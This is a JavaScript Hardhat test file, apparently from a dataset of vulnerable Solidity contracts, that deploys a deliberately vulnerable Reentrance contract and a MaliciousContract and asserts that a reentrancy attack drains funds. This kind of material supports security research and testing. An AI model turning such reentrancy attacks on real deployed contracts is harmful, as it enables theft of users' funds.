const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for reentrance.sol", function () {
  let Reentrance;
  let victim;
  let MaliciousContract;
  let hacker;

  beforeEach(async function () {
    // Deploy Log contract

    // Deploy Reentrance contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/reentrance.sol/Reentrance.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    Reentrance = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await Reentrance.deploy();
    await victim.waitForDeployment();

    // Deploy MaliciousContract with Reentrance address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/reentrance_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("sanity check: reentrancy/reentrance.sol", async function () {
    const [sig] = await ethers.getSigners();
    expect(await victim.balanceOf(sig.address)).to.equal(0);
    await expect(
      victim
        .connect(sig)
        .donate(sig.address, { value: ethers.parseEther("1") }),
    ).to.not.be.reverted;
    expect(await victim.balanceOf(sig.address)).to.equal(
      ethers.parseEther("1"),
    );
    await expect(victim.connect(sig).withdraw(ethers.parseEther("1"))).to.not.be
      .reverted;
    expect(await victim.balanceOf(sig.address)).to.equal(0);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.donate(victim.target, { value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from hacker on victim contract
    await hacker.deposit({ value: ethers.parseEther("4") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("9"));

    // Set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack(ethers.parseEther("1"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    hackerBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful

    // victim has lost more funds than the withdrawal
    expect(victimBalance).to.be.below(ethers.parseEther("8"));

    // hacker has more than the withdrawal
    expect(hackerBalance).to.be.above(ethers.parseEther("1"));
  });
});
